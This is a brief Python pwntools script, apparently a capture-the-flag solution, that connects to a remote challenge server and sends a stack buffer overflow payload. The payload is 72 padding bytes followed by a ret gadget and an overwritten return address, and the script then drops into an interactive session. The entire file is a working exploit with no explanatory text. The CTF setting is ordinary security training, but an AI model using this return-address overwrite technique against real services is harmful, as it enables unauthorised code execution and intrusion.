from pwn import *
#p=process("./chall")
p=remote('chal.78727867.xyz', 9999)
payload=b'a'*72+p64(0x000000000040101a)+p64(0x4011b6)
#input()
p.sendline(payload)
p.interactive()
